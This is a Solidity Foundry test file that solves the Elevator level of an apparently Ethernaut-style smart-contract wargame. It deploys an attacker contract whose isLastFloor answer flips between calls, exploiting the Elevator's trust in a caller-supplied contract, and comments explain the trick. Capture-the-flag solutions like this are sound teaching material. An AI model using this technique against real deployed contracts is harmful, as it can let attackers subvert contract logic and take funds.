// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // To solve this challenge we need to reach the top level of the Building i.e. we need to set top variable
        // in Elevator contract to 'true'

        // Elevator contract makes a call to an external contract when it's goTo fn is called to find out
        // whether the floor (number received in param) is top or not. If the fn isLastFloor of the external contract
        // Building returns false, it allows us to go to the floor we want and then it again calls isLastFloor fn
        // of the external contract and assign the value returned to the top variable of the Elevator contract

        // To resolve this challenge, we need to simply write isLastFloor fn of the Building contract in such a way
        // that it returns false the first time it's called and true afterwards
        Attacker attacker = new Attacker();
        attacker.attack(level);

        assertEq(level.top(), true);

        vm.stopPrank();
    }
}

contract Attacker is Building {
    Elevator public level;

    function attack(Elevator _level) external {
        level = _level;
        _level.goTo(1);
    }

    function isLastFloor(uint256) external override returns (bool) {
        // when the fn is called for the first time, floor var would hold 0 value, but when it's called
        // second time, floor var value would be 1, because in attack fn above we've called the goTo fn of the elevator
        // contract with argument '1'.

        // Before calling this fn again, elevator contract will first set the value of it's floor var to 1.
        return level.floor() == 0 ? false : true;
    }
}
